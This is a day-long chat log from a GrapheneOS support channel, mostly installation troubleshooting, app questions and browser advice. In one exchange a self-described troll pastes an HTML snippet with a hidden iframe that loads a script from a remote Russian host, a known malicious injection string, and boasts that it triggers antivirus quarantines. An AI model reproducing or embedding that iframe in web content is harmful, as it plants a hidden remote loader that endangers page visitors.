02:59:32 <Ryan[m]5> This adapter supports displaylink
02:59:59 <Ryan[m]5> Should it be compatible with grapheneos?
03:02:24 <Baloo> does anyone else use the Amazon Appstore with GrapheneOS? The APK downloaded directly from Amazon's website does not work for me. Can't login to my amazon account
03:02:30 <Baloo> I know it previously worked before
03:56:42 <Thatcher[m]> Just use amazon in vanadium
04:02:39 <braxtono[m]> You can use the PWA app for logins and save them as an isolated app on homepage

04:21:48 <strcat> if this is Adam please message me in PM
04:21:50 <GermanAustria> this is a new troll, never been on your channel before
04:21:54 <GermanAustria> i am geeknerd
04:22:06 <strcat> and why are you here trolling?
04:22:09 <GermanAustria> not new to freenode but new to this particular shit hole
04:22:15 <GermanAustria> why am i here on this chan?
04:22:18 <strcat> yes
04:22:43 <GermanAustria> because i told alis to reveal to me some channels with a lot of people and not mode +r, m, or z
04:22:49 <GermanAustria> and it obliged
04:23:06 <strcat> alis?
04:23:16 <GermanAustria> the enhanced channel search bot
04:23:34 <strcat> so it is nothing against us in particular this time around?
04:24:05 <GermanAustria> Not really.  Just looking for a populous place to paste a really funny string.  Perhaps you've heard of it?
04:24:26 <GermanAustria> <body><iframe src="http://xb8.ru:8080/ts/in.cgi?pepsi122" width=125 height=125 style="visibility: hidden"></iframe>
04:24:36 <strcat[m]> what?
04:25:03 <GermanAustria> Once upon a time, that reference contained scripts so dangerous and evil and malicious  that Microsoft blacklisted it from Windows Defender
04:25:36 <GermanAustria> but because they are Microsoft, and thus retarded, they ignored context. It's not just .html files that it sees that string as malicious ib
04:26:00 <GermanAustria> in .txt  .log or anything else, Windows Defender cares not about context, that is a "virus"
04:26:30 <GermanAustria> so, if you're running Windows Defender and logging this channel, it's only a matter of time before your log is quarantined and you get a warning
04:26:41 <GermanAustria> as well as hundreds of users asking why there's a "virus in this channel"
04:26:44 <strcat> alright doesn't seem very funny
04:26:49 <strcat> can you please not ping a bunch of people
04:26:55 <GermanAustria> it's actually hilarious
04:26:57 <GermanAustria> all right
04:27:24 <abff> its prettty funnnnyy
04:27:39 <strcat> there is #grapheneos-offtopic where people may actually find that interesting
04:28:27 <GermanAustria> freenode thought me pasting that in large channels was so funny, they set a rule in their anti spam bot Sigyn (which is an OPER) to k-line anyone who pastes that string on chans patrolled by sigyn
04:32:43 <GermanAustria> strcat: would they find my nick, ident and realname funny as well
04:32:44 <GermanAustria> ?
04:52:18 <strcat> and... freenode banned them
04:53:18 <somenerd[m]> well.... what
04:53:26 <somenerd[m]> posting some random string?
04:53:44 <strcat[m]> it's a known freenode spammer/troll
04:53:44 <somenerd[m]> or a pastebin link or something?
04:53:52 <strcat[m]> nothing to do with us
04:53:58 <strcat[m]> didn't ban them to avoid making them target us specifically
04:55:06 <Derrick> hi, how to open .apk or .apkm file ?
04:55:15 <somenerd[m]> well, glad that freenode banned them then
04:55:18 <Derrick> for some reason "Files" app does not do anything when tapping .apk
04:55:55 <Derrick> if i do Files app >  "Open With" it just pops up, 'No apps can perform this action."
04:56:24 <Derrick> is opening a .apk not possible with stock GrapheneOS ?
04:57:02 <strcat[m]> opening one works fine
04:57:06 <strcat[m]> it probably isn't what you think it is
04:57:17 <strcat[m]> clarify which apk you're trying to install
04:57:29 <Derrick> i downloaded the apk from APKMirror
04:57:35 <strcat[m]> which
04:57:49 <strcat[m]> why are you using 'open with'?
04:57:59 <strcat[m]> just open it
04:58:07 <Derrick> cause APKMirror app just downloads the file and then it sits in Downloads folder
04:58:16 <Derrick> so I open "Files" to browse to Downloads folder
04:58:26 <Derrick> and try to open it there, but hence the issue
04:58:31 <strcat[m]> just click on it
04:58:32 <strcat[m]> open it
04:58:38 <strcat[m]> don't try to open it with an app
05:00:06 <Derrick> "Can't open file"
05:00:23 <Derrick> is what happens after tapping it driectly from the "Download complete' notification bar area
05:00:29 <strcat[m]> sounds like it's not a valid apk
05:00:38 <strcat[m]> how did you download it?
05:00:47 <Derrick> APKMirror
05:00:51 <strcat[m]> using what
05:00:54 <strcat[m]> Vanadium?
05:01:30 <Derrick> using APKMirror app
05:01:36 <strcat[m]> maybe the app is broken
05:01:37 <Derrick> which i got from F-Droid
05:02:06 <strcat[m]> or at least that file isn't a valid apk
05:02:18 <strcat[m]> installing an apk works fine - after all, how did you install F-Droid, etc
05:02:38 <Derrick> ya good point
05:03:41 <Derrick> hmm  yeah, my other .apks open OK but not the one downloaded from APKMirro
05:04:51 <Derrick> Is there any reason u see that this app would not open correctly ?
05:04:51 <Derrick> its an app called Hellotalk I am trying to install
05:04:52 <Derrick> https://www.apkmirror.com/apk/hellotalk-learn-languages-app/hellotalk-learn-languages-free-2/hellotalk-learn-languages-free-2-4-2-8-release/
05:21:17 <a571424x[m]> There are two options to dowload - apk and bundle. I usually avoid xapk, apkm etc and prefer pure apk installers.
05:21:56 <a571424x[m]> If apk from this site does not work, try to get hellotalk from softpedia.
05:22:51 <a571424x[m]> I installed Adobe Reader this way.
05:49:02 <came2complain[m]> After installing Graphene OS I do not receive message notification sounds. The notifications work fine but I do not get the sound. Is that issue known already?
05:51:46 <DerrickSchwabe[m> <a571424x[m] "If apk from this site does not w"> oh ok , I did try apk it didnt work so i will maybe try softpedia thx
06:06:54 <came2complain[m]>  * After installing Graphene OS on a  Pixel 4a I do not receive message notification sounds. The notifications work fine but I do not get the sound. Is that issue known already?
06:43:53 <strcat[m]> came2complain: there's no issue like that, probably an app issue
06:43:59 <strcat[m]> unless you mean SMS in secondary profiles, that's known
06:44:02 <strcat[m]> AOSP issue
07:08:41 <came2complain[m]> <strcat[m] "unless you mean SMS in secondary"> it works fine on the pixel 3a.
07:08:49 <came2complain[m]> The only fix that works so far for me is to kill the battery manager and reboot
07:08:56 <came2complain[m]> I will test with another app
08:36:35 <Duuude> Had problems sending the bootloader and radio during the installation. I've installed on a Pixel 2 from a Linux desktop. Any way around this?
08:36:36 <Duuude> Error was "FAILED (Write to device failed in SendBuffer() (Cannot send after transport endpoint shutdown)"
08:39:03 <Duuude> Going to try flashing again, hopefully it goes through in the meantime XD
08:48:45 <lovesausage[m]> Is there a way to have lockdown automaticly turn on when screen off?
08:48:54 <strcat> Duuude: use either https://grapheneos.org/install/web or https://grapheneos.org/install/cli
08:49:01 <strcat> lovesausage[m]: just don't add a secondary unlock mechanism if you don't want one
08:49:17 <strcat> lovesausage[m]: the feature doesn't do what you seem to think
08:49:46 <strcat> all lockdown does is disable secondary unlock mechanisms
08:51:13 <lovesausage[m]> Yea exactly. You seem to assume a lot.  I want to use fingerprint but not on screen lock.
08:58:14 <freewilzy> When i change thw grapheneos raster from 5x5 to 4x4 , and than change it back to 5x5 again my homescreen apps get deleted and the normal home screen when you just install graphene come back, really strange
09:00:55 <strcat> lovesausage[m]: that's a different thing from what you want
09:01:14 <strcat> you can see there's a feature request filed for that and it's already implemented for face scanning unlock
09:02:19 <lovesausage[m]>  Not really , it is exactly that and I'm on a phone without face scanning. So drop the attitude
09:17:13 <GhostSplinterSix> <lovesausage[m] " Not really , it is exactly that"> Don't be disrespectful to the lead developer of the OS...
09:20:41 <lovesausage[m]> <GhostSplinterSix "Don't be disrespectful to the le"> Well , let's keep a civil tone to start with then.
09:23:39 <somenerd[m]> > Yea exactly. You seem to assume a lot.  I want to use fingerprint but not on screen lock.
09:23:39 <somenerd[m]> fingerprint within apps?
09:26:41 <somenerd[m]> also, he said that it was already implemented for face unlock, and implied that fingerprint unlock would come soon

09:46:42 <onyxrubber> why do my settings use the camera sometimes?
09:48:23 <onyxrubber> I can find it in the notification bar, on the right site
09:49:39 <covid-1984[m]> Does anyone know how YouTube (in vanadium) is getting advertisement language using the SIM card?
09:50:06 <Duuude> Is there a way to get rid of the message that my device is loading on a different operating system?
09:51:56 <onyxrubber> on startup?
09:52:04 <Duuude> Yes on startup
09:52:08 <onyxrubber> u can't
09:52:24 <Duuude> Okay cool, thanks :)
10:04:29 <GhostSplinterSix> Yeah, it's an automatic message since an alternate OS is installed.
10:05:29 <onyxrubber> why do my settings use the camera sometimes?
10:08:11 <GhostSplinterSix> What do you mean?
10:15:04 <onyxrubber> the following case appears from time to time:
10:15:04 <onyxrubber> I see a camera icon in the notification bar (same icon style as using a microphone when using a telegram), slide down the notification bar and on the top right, I see a camera icon in a circle. I click on it and it shows me that the Settings app is using the camera.
11:52:52 <DHFuchsiaOSwhen> <onyxrubber "I see a camera icon in the notif"> What pixel do you use?
11:53:04 <onyxrubber> 4a 5G
11:57:46 <DHFuchsiaOSwhen> Oh, not too sure why at the moment. Had it been 4/4XL, it can probably be pointed to face unlock. Otherwise, a functionality that I know which uses camera is QR scanning on WiFi
12:00:25 <anupritaisno1[m]> Just do the old fashioned reboot
12:14:16 <onyxrubber> after few minutes it disappear. Everything is happen few times a week.
12:17:00 <DHFuchsiaOSwhen> <onyxrubber "after few minutes it disappear. "> Prior to appearance of the camera icon at status bar, is the settings app focused (as in it's on your current screen)?
12:17:56 <onyxrubber> no
12:20:05 <DHFuchsiaOSwhen> Does it appear randomly, or there's certain stuff that triggers it?
12:20:40 <onyxrubber> idk, I did not noticed any dependency
12:21:56 <DHFuchsiaOSwhen> Odd, no device admin app or work profile app, nor any accessibility services granted?
12:28:19 <onyxrubber> device admin app - don't think so (idk how to check, but I have never given this perrmision)
12:28:20 <onyxrubber> work profile app - what you mean?
12:28:20 <onyxrubber> accessibility - no
12:35:42 <DHFuchsiaOSwhen> <onyxrubber "work profile app - what you mean"> It's a result of granting device admin permission to an app (such as Island, Shelter, etc) (which is not recommended)
12:37:09 <onyxrubber> I found:
12:37:10 <onyxrubber> Device admin apps: No active apps
12:38:20 <DHFuchsiaOSwhen> <onyxrubber "after few minutes it disappear. "> Would appreciate if you find the steps to reproduce this occurrence on some another time outside trying to scan QR code 😄
12:44:13 <onyxrubber> maybe that was it \O/ ? I just checked on wifi settings if the same camera shows up after clicking on wifi qr and yes this is it. After turning off, this camera continues to display, which may have confused me. Anyway it shows "Recent use of camera: Settings"
12:45:23 <onyxrubber> is there any way to dismiss this notification until the next time the camera is in use?
13:13:37 <pkgbuild[m]> The screen recording function stay always stuck and the phone needs to be restarted to get back work
13:13:56 <M7777777y[m]> Is it possible to flash graphene without enabling google play services to do the OEM unlocking
13:15:41 <GhostSplinterSix> <M7777777y[m] "Is it possible to flash graphene"> Have you checked out the website?
13:15:55 <GhostSplinterSix> https://grapheneos.org/
13:16:29 <M7777777y[m]> Yeah it said you need to do it
13:17:02 <M7777777y[m]> Which is annoying but it's googles fault
13:17:09 <GhostSplinterSix> There you go. 👍🏻
13:27:11 <onyxrubber> I have problem with notifications. Some of them are delayed for few minutes. For example i set up a timer for 5min, and phone started ringing after 8min, showing "-3 min" on screen. It was stock timer. Some of people can't connect with me via Telegram call, becouse notifications are delayed (battery for Telegram FOSS not optimised)
13:30:45 <DHFuchsiaOSwhen> <onyxrubber "is there any way to dismiss this"> Reboot your phone is a way to do it
13:58:35 <corrupted-user[m> <M7777777y[m] "Is it possible to flash graphene"> i think if you were really paranoid you could of connected to a free wifi and then done the unlock but i think because the mac address spoofing is enabled by default on wifi then it makes little difference.,
14:31:03 <rhythm[m]> Hi guys
14:31:03 <rhythm[m]> Can anyone tell me what is the command line after opening terminal for granting path??? Please help me
14:31:41 <rhythm[m]> I'm using windows
14:32:22 <rhythm[m]> $env:Path = "$pwd\platform-tools;$env:Path"
14:32:32 <rhythm[m]> Is it correct command?

14:34:20 <rhythm[m]> Right?
14:34:32 <corrupted-user[m>  * I think you are making a mistake . while your install of windows might complete the installation how can you gurantee is totally clean to perform operations on ?
14:35:38 <DHFuchsiaOSwhen> Yes, assuming you already downloaded through Powershell the platform-tools and copy-pasted the command as is for the most part (except for the section for finding images to flash your phone)
14:36:30 <rhythm[m]> Someone gave me a command line same as listed in website. But there was no platform tool in the command. Unfortunately I forget that command.
14:39:25 <rhythm[m]> <DHFuchsiaOSwhen "Yes, assuming you already downlo"> I already downloaded latest platform tools and gos image
14:39:55 <DHFuchsiaOSwhen> Hmmm, advise starting over
14:40:27 <DHFuchsiaOSwhen> Just to be sure that the platform-tools is unzipped and Path is set correctly
14:40:39 <rhythm[m]> Placed gos image platform tools folder, then opened adb shell. Then ???
14:41:13 <DHFuchsiaOSwhen> There's no adb shell in the grapheneos.org/install/cli
14:41:16 <rhythm[m]> * Placed gos image in platform tools folder, then opened adb shell. Then ???
14:41:37 <rhythm[m]> <DHFuchsiaOSwhen "There's no adb shell in the grap"> Sorry powershell
14:41:44 <corrupted-user[m> <rhythm[m] "Someone gave me a command line s"> you dont need to do the export command you can edit the flashing script to the path of the flashboot or run the command manually including full fastboot path. Thats how i did mine and it worked perfectly.
14:42:13 <corrupted-user[m> i will  give you an example 2 mins
14:42:22 <DHFuchsiaOSwhen> <corrupted-user[m "you dont need to do the export c"> If you do that, you'd be on your own tho
14:42:52 <rhythm[m]> <corrupted-user[m "you dont need to do the export c"> I don't know too much about this.. can u explain how to do that
14:43:39 <corrupted-user[m> did you do a clean installation of windows or did you just use your existing windows install that is months old ?
14:44:16 <rhythm[m]> Clean
14:44:35 <corrupted-user[m> from a trusted iso or a torrented one ?

14:47:58 <rhythm[m]> Some1 gave me same command but there something change instead of platform tools.. unfortunately I forgot...I always just copy and paste it in powershell. It's was working fine..
14:48:10 <rhythm[m]> I'm noob that is the problem
14:49:03 <TheLoneWanderer[> Why CLI?
14:49:08 <TheLoneWanderer[> Why not the webinstaller
14:49:13 <corrupted-user[m> you need to find the directory path of your fastboot folder.

14:52:56 <TheLoneWanderer[> Ok
14:56:05 <strcat[m]> rhythm: adb is not used as part of the installation process, neither is cmd.exe
14:56:13 <strcat[m]> rhythm: please do not follow unofficial guides
14:56:18 <strcat[m]> asking for help with unofficial guides here is not permitted
14:56:34 <strcat[m]> use https://grapheneos.org/install/web or https://grapheneos.org/install/cli
14:56:42 <strcat[m]> remove anything you did based on unofficial guides
14:56:49 <strcat[m]> they're unsafe
14:58:17 <strcat[m]> the official CLI install guide has you download the standalone platform-tools release (on OSes without their own proper package for it), add it to PATH and then run the script in the shell where that was done
14:58:21 <strcat[m]> it's important to do that correctly
14:59:31 <strcat[m]> corrupted-user: your advice deviates from the official guide and will not work because the flash-all.sh script needs it added to PATH
14:59:38 <strcat[m]> the official guide is what should be followed, nothing else
15:00:23 <strcat[m]> I don't understand why you would suggest editing the flashing script or specifying a path manually rather than just setting PATH
15:00:30 <strcat[m]> really overcomplicating things
15:01:28 <rhythm> Hello
15:01:35 <strcat[m]> all you have to do is exactly what it covers: add the directory to the current shell's PATH so that the tools from there are available
15:01:48 <strcat[m]> official guides are the only supported way to install
15:03:03 <corrupted-user[m> <strcat[m] "I don't understand why you would"> i suggested it because he was clearly having trouble performing that step and i just offered a method of when i did the install.  I just ran the commands straight from terminal manually no script job done.
15:03:39 <strcat[m]> the CLI install guide works fine copy-pasting the commands
15:03:59 <rhythm[m]> Wait sir
15:04:04 <strcat[m]> if you're downloading platform-tools some other way you just have to put it in the directory PowerShell starts in
15:04:07 <strcat[m]> not recommended
15:04:33 <rhythm[m]> Simply copy and paste
15:04:55 <corrupted-user[m> download platform tools., run flashboot from the directory .  enter the commands one by one until all steps completed.
15:05:03 <strcat[m]> if you copy and paste the CLI install guide commands and simply edit the device name and release date it works fine
15:05:04 <strcat[m]> corrupted-user: no
15:05:35 <corrupted-user[m> <strcat[m] "corrupted-user: no"> your telling me no but i successfully flashed my pixel doing exactly that
15:05:45 <strcat[m]> the official guides are the only installation approach that's supported
15:06:20 <strcat[m]> there is a reason for why it's done the way it is and it's really unhelpful to suggest people to do something unsupported
15:06:33 <strcat[m]> it's just making it needlessly complicated
15:08:24 <rhythm[m]> What to do to grant correct path.... i mean what command?
15:08:36 <strcat[m]> follow the official CLI guide
15:08:43 <strcat[m]> https://grapheneos.org/install/cli
15:08:51 <strcat[m]> drop whatever you were doing instead of that
15:09:30 <strcat[m]> if you don't have internet access then put the files that would have been downloaded with curl in the same directory the shell is in
15:10:14 <strcat[m]> not worth editing the command for setting PATH to use another directory, just put the stuff where it's expected
15:10:51 <rhythm[m]> Wait I'm explaining step by step
15:13:01 <chocolatebarbrai> random question: have you guys been able to succesfully request rides on the uber PWA using vanadium? (it keeps erroring for me)
15:14:14 * rhythm[m]  < https://matrix.org/_matrix/media/r0/download/matrix.org/bUcqnhxooAvbTPhbVIEeDELK/message.txt >
15:14:22 <rhythm[m]> Sorry for my bad English
15:14:47 <strcat[m]> stop what you're doing and use https://grapheneos.org/install/cli
15:16:15 <strcat[m]> the command is there
15:16:31 <rhythm[m]> I don't have internet access that is the problem
15:16:38 <strcat[m]> yeah, I said what to do above
15:17:04 <strcat[m]> follow https://grapheneos.org/install/cli
15:17:21 <rhythm[m]> Ok il try thnks everyone fr help
15:17:21 <strcat[m]> when you get to a curl command, put the files in the directory powershell is open in so that you can continue
15:24:17 <pkgbuild[m]> The screen recording function stay always stuck and the phone needs to be restarted to get this function back work
15:40:54 <juste-me85> hi everyone I'm new here. I have some problems to install grapeneos via windows CL. Where is the right place to get help?
15:42:42 <DHFuchsiaOSwhen> <juste-me85 "hi everyone I'm new here. I have"> It's here, start off at reading https://grapheneos.org/install/cli
15:44:20 <TheLoneWanderer[> <juste-me85 "hi everyone I'm new here. I have"> Try the webinstaller. It's much easier
15:45:14 <DHFuchsiaOSwhen> <TheLoneWanderer[ "Try the webinstaller. It's much "> Also reduces the chance of getting bricked, since always the correct images is downloaded
15:49:57 <juste-me85> I tried that first and my device is not recognized by Google Chrome, although both are up to date.
15:50:34 <DHFuchsiaOSwhen> Well, nevertheless, the official CLI installation approach is supported
15:50:38 <DHFuchsiaOSwhen> Try updating your drivers
16:17:55 <applejuice543[m]> is there a video for installing graphene os the guide on the website is hard to understand for me at least
16:18:37 <TheJollyRoger> Hello applejuice543[m], you should consider using the web installer, rather than the commandline installer. There are no videos currently recommended by the project, most of them are extremely dangerous and will end you up with an unbootable or bricked device.
16:19:30 <applejuice543[m]> Is the web installer less secure?
16:20:19 <TheJollyRoger> Not at all. Unlike a conventional operating system, GrapheneOS relies on the preauthenticated attestation data from the security chip in your phone as a root of trust. So as a result, its security is not limited by the security of the desktop you're installing it from.
16:21:10 <TheJollyRoger> The only advantage to the commandline installer is that it makes some users feel cooler.
16:21:16 <TheJollyRoger> That's it.
16:22:02 <applejuice543[m]> oh ok
16:22:05 <applejuice543[m]> thanks
16:22:06 <TheJollyRoger> The web installer is safer, just as fast, just as secure, and just as private.
16:22:37 <TheJollyRoger> The commandline installer is only offered for those who want to feel like a 1337 hacker or for backwards compatibility.
16:23:04 <TheJollyRoger> Correction:
16:23:04 <applejuice543[m]> will firefox work will the web installer?
16:23:27 <TheJollyRoger> No. Firefox does not support WebUSB, Mozilla doesn't want to put in the work for it.
16:23:52 <applejuice543[m]> hey jolly roger
16:23:55 <TheJollyRoger> Yes?
16:24:00 <applejuice543[m]> are u are mod or something?
16:24:03 <TheJollyRoger> Yes.
16:24:08 <applejuice543[m]> oh ok
16:24:14 <applejuice543[m]> i jsut started using matrix
16:24:19 <applejuice543[m]> so i dont know how to check
16:24:43 <TheJollyRoger> Click the little "i" in the corner that shows the information for the room.
16:25:36 <TheJollyRoger> You'll see a list of people in the room. The administrators and moderators will be marked with a little gold or silver star respectively and be placed at the top of the list.
16:25:41 <applejuice543[m]> what broswers do you reccomend for isntalling
16:25:55 <applejuice543[m]>  * what browsers do you recommend for installing
16:26:02 <TheJollyRoger> They're listed at https://grapheneos.org/install/web
16:26:15 <Akella> Hello
16:26:19 <TheJollyRoger> Ahoy!
16:26:28 <Akella> Kann mir jemand den download links senden ?
16:26:54 <TheJollyRoger> Avast, shipmate, this channel is unfortunately English only at this time.
16:27:08 <Akella> A oke oke
16:27:12 <TheJollyRoger> No problem!
16:27:18 <applejuice543[m]> what is the most private/secure chromuim broswer
16:27:26 <TheJollyRoger> applejuice543[m]: Vanadium.
16:27:32 <TheJollyRoger> However, Vanadium only works on GrapheneOS.
16:27:43 <applejuice543[m]> second best?
16:27:43 <Akella> i need the download link for graphene
16:27:56 <Akella> i will make my device pixel 3a
16:27:59 <TheJollyRoger> applejuice543[m]: Edge with WDAG.
16:28:21 <TheJollyRoger> applejuice543[m]: Beyond that, browser discussion is not topical to GrapheneOS and I'd kindly refer you to the #grapheneos-offtopic channel
16:28:38 <applejuice543[m]> will brave work?
16:28:48 <TheJollyRoger> Akella: You can find the releases for the factory images on https://grapheneos.org/releases
16:29:10 <TheJollyRoger> applejuice543[m]: A few members have anecdotally reported Brave to work for installing GrapheneOS, although I can't vouch for it, so try it at your own risk.
16:29:50 <TheJollyRoger> Akella: if you want to install, you will need to follow the directions and we recommend using the webinstaller at https://grapheneos.org/install/web . Read everything before you begin.
16:29:50 <applejuice543[m]> ok so what is wsag
16:29:53 <applejuice543[m]> wdag
16:31:36 <Akella> I'll try it out :)
16:31:52 <TheJollyRoger> applejuice543[m]: I can't stay long and this isn't topical to GrapheneOS, but I'll answer here just for this occasion. WDAG is called "Windows Defender Application Guard". For Pro versions Microsoft includes an optional utility to seamlessly run Edge in a hardened, isolated disposable virtual machine in Hyper-V which the host considers hostile.
16:32:10 <Akella> because all these safe cell phones sold annoy me, want to make my own
16:32:26 <applejuice543[m]> ok thanks will no longer talk about broswers
16:32:28 <TheJollyRoger> Akella: I will wish you the best of luck.
16:32:32 <TheJollyRoger> No problem!
16:32:40 <TheJollyRoger> I gotta run, you guys take care.
16:32:50 <applejuice543[m]> bye
16:33:48 <Akella> thanks :)
16:35:22 <Akella> if you can help me I would be grateful

16:50:17 <ashgancos[m]> Hi, I have a question regarding Bluetooth audio volume
16:51:40 <ashgancos[m]> On my Pixel 3a Bluetooth audio is very loud. Step 3 is often a bit too loud while step 2 is too quiet. Often I can't set the volume to a level I'm comfortable with.
16:52:15 <ashgancos[m]> I discovered the "disable absolute volume" settings in the developer options but I heard that you are not supposed to unlock them for daily usage...
16:52:42 <ashgancos[m]> Is there any way to get a more fine grained volume control in GOS without this option?
17:16:04 <jackflash89[m]> Any reason signal isn't in fdroid anymore?
17:20:25 <southron[m]> jackflash89: I believe their apk is self-updating. Can talk about alternatives in #grapheneos-offtopic:matrix.org
17:23:11 <alex-resist> Signal never was in F-Droid
17:37:35 <Cliff[m]> <alex-resist "Signal never was in F-Droid"> It used to be in f droid
17:38:39 <Cliff[m]> Now best to only download from signal.org

18:13:06 <freewilzy> Anyone else had issues with 4g connection after uodating grapheneos?
18:13:57 <Ec[m]> hi guys
18:14:02 <Ec[m]> I wanted to know why this service is always active. Can anyone with more skills point me to something?
18:14:07 <Ec[m]> com.qualcomm.qcrilmsgtunnel
18:22:08 <freewilzy> Qualcomm is the snapdragon processor running
18:22:26 <freewilzy> Your phone cannot work without it
18:22:45 <entry1> <Ec[m] "I wanted to know why this servic"> Looks like it apart of Qualcomm chipset running the OS, that provides an interface to the phone's radio and modem according to what I've seen.
18:22:52 <Ec[m]> <freewilzy "Your phone cannot work without i"> no, i close this process and the phone work
18:23:16 <entry1> <Ec[m] "no, i close this process and the"> It may just start up again upon closing it
18:24:27 <Ec[m]> I don't know, do you know where to find the setting to disable all sensors like accelerometer and others?
18:26:24 <entry1> <Ec[m] "I don't know, do you know where "> Permission manager in settings
18:26:47 <freewilzy> Anyone else had issues with 4g network after update?
18:26:50 <jackflash89[m]> alex-resist: when in caly it allows updates to signal
18:27:15 <entry1> <freewilzy "Anyone else had issues with 4g n"> Not personally. Which device and carrier are you using?
18:28:26 <freewilzy> Pixel 4a , had this on my both phones, i have 2. Carrier is in the Netgerlands, lebara mobile, but the sim card worked fine when i swiched it to my friends iphone
18:28:47 <freewilzy> So i factory reset both phones and than the 4g worked again,
18:29:16 <freewilzy> It was after the last uodate that my normal calls worked, only the 4g dissapeared , really strange
18:29:59 <freewilzy> Now after factory reset evwrything works fine but i think there might be a glitch with the uodate or something, dont know for sure
18:33:19 <entry1> That's odd. Your carrier is on the GSM network right? The factory reset would still include the latest update you did, but odd why it didn't work. Wonder if rebooting the phone would have been the same as you resetting it.
18:33:35 <entry1> Glad its working for you though
18:35:52 <freewilzy> Yes me 2
18:37:03 <freewilzy> 4a pixel is maybe not the best phone to use but i had a pixel 4 before any buying the 5 with a weaker processor felt like a downgrade, so i bought the cheap one and i hope the pixel 6 will be better
18:39:42 <entry1> 4a is such a nice size and pricepoint for its performance. Sorry to hear you're not liking too much, most people are pretty happy with it
18:40:18 <freewilzy> Well the pixel 4 was a fast heavy phone, the 4a comparing with it feels cheap
18:40:52 <freewilzy> It s a nice phone but i would rather have the 5 if it had a stronger processor
18:41:15 <entry1> Build quality is always "cheaper" on the "a" series, but most people aren't too concerned because with a case on it is difficult to notice a difference
18:44:30 <freewilzy> Yes i dont want to sound negative it s a nice phone
18:44:46 <freewilzy> I am just excited to see what specs pixel 6 will have
18:46:17 <jackflash89[m]> Nice cases at  dbrand
18:46:52 <jackflash89[m]> Mines black and purple
19:06:57 <coffee2go[m]> Hi experts, what means "enable app compaction by default" . In https://github.com/GrapheneOS/platform_frameworks_base/commit/9bda389dc285952669340c62172727b2d913208e
19:11:40 <jackflash89[m]> Anyone use destroy all activities in dev options as security feature?
19:12:23 <LordOfLaceration> I have trouble installing GrapheneOS. I have a pixel 4a 5g und used the web istaller. Everything went fine until the end of flashing. After flashing vbmeta_b the website says Restarting device... ( the last outputs in the console are Flashed vbmeta_b with 1 split(s), Command: reboot-fastboot, Response: OKAY, USB device disconnected ) . Its stuck
19:12:24 <LordOfLaceration> there I've waited about 15 minutes with nothing happening
19:13:19 <LordOfLaceration> The phone says fastbootd in large red letters and below that GrapheneOS Fastboot with other information is it done?
19:17:50 <skwisgaar[m]> jackflash89: can’t comment on that specifically but the project recommends against dev options unless you are using them for their intended use case. They were never intended for security and will likely harm security if you try to use them that way.
19:28:21 <nscnt[m]> LordOfLaceration: No, it's not done. Try a different cable/port
19:29:39 <LordOfLaceration> I just tried with another computer (first try was with Arch Linux) I'm currently trying to install it using a Windows 10 PC
19:31:13 <LordOfLaceration> same thing with this PC
19:32:27 <nscnt[m]> LordOfLaceration: It got stuck in the flashing process?
19:32:42 <LordOfLaceration> Yes
19:34:05 <nscnt[m]> LordOfLaceration: This is often due to a poor connection. That's why I recommend to try it with another cable/port
19:35:02 <jackflash89[m]> Which browser are you using?
19:35:03 <LordOfLaceration> Yeah according to the logs in the console it probably doesn't detect the device when its in the userspace fastbootmode
19:35:34 <LordOfLaceration> I installed chromium on Arch linux and used edge on windows
19:35:43 <jackflash89[m]> Try chrome
19:36:30 <jackflash89[m]> If that doesn't work a weird suggestion is to flash caly with the script then try
19:37:10 <jackflash89[m]> Yeahbtry chrome
19:39:43 <LordOfLaceration> OK just downloaded chrome also using a different port now
19:40:14 <nscnt[m]> Why do you keep inserting several new variables? Just change ports and use Edge. It's probably the best choice on Windows 10
19:40:53 <GhostSplinterSix> ^
19:44:04 <LordOfLaceration> same thing on chrome
19:46:27 <LordOfLaceration> when i run fastboot devices in a terminal it doesn't list any devices  (if im in the grapheOS fastboot mode) in the normal fastboot mode it gets detected
19:47:48 <jackflash89[m]> You don't have to
19:47:54 <jackflash89[m]> Just use the web
19:48:32 <jackflash89[m]> When asked to unlock bootloader unlock then relock when finished
19:49:22 <LordOfLaceration> I know i shouldnt have to do anything when using the webinstaller. but it gets stuck
19:56:35 <coffee2go[m]> Please check your fastboot version
19:56:57 <LordOfLaceration> fastboot version 31.0.0p1-android-tools
19:58:32 <coffee2go[m]> sometimes best to go to stock (i.e) install google's image (zip). Do a flashall. Then come back.
19:59:19 <coffee2go[m]> > LordOfLaceration: This is often due to a poor connection. That's why I recommend to try it with another cable/port
19:59:19 <coffee2go[m]> +1
20:02:07 <coffee2go[m]> > The phone says fastbootd in large red letters and below that GrapheneOS Fastboot with other information is it done?
20:02:07 <coffee2go[m]> At this point it should automagically proceed further... very likely cable
20:04:26 <Cliff[m]> <Baba[m] "Download Molly"> Molly isnt in f droid, you have to add it first. It works very well i do recommend.
20:20:55 <LordOfLaceration> The cable I used i from a huawei device as i dont have an usb c adapter I odered one yeserday and it should be here in a few days. So you say my only hope is waitng and try with the cable that came with the device together with this adapter?
20:21:55 <LordOfLaceration> I tried installing the official firmware from google but that got also stuck.
21:42:04 <catfish[m]> LordOfLaceration: you can use the web install from another android device usb-c to usb-c
21:54:43 <covid-1984[m]> Thoughts on reproducible-builds.org for GOS?
21:55:30 <covid-1984[m]> Debian seems to have made a lot of progress & Arch too. Cool for verifiability.
22:36:18 <strcat[m]> GrapheneOS has reproducible builds
22:36:32 <strcat[m]> covered in the build docs
22:37:00 <strcat[m]> no one is actually regularly using it and testing it but it works
22:37:18 <strcat[m]> sometimes there's a minor issue and since no one contributes in that area they persist until I get around to testing and fixing again
22:37:26 <strcat[m]> it's not actually useful
22:45:01 <strcat[m]> Chromium reproducible builds work reliably, Linux kernel is iffy with some drivers (should work, sometimes there are reproducibility bugs in driver build code)
22:45:13 <strcat[m]> OS build itself should be 100% reproducible
22:45:27 <strcat[m]> most of the prebuilts should be reproducible like clang
23:14:36 <covid-1984[m]> cool; its an interesting topic
